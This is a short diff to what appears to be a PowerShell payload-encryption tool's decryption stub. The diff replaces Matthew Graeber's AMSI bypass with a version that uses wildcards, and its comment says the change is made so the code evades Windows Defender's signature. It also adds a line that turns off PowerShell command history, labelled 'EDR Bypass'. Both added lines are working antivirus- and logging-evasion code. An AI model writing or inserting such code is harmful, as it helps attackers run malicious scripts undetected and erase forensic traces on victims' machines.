@@ -300,8 +300,11 @@ $DecryptionStub=@"
 if(`$Password -and `$Salt)
 {
 
-#AMSI Bypass by Matthew Graeber
-[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue(`$null,`$true)
+#EDR Bypass
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+
+#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
+(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
 
 foreach(`$ef in `$EncryptedFunctions)
 {
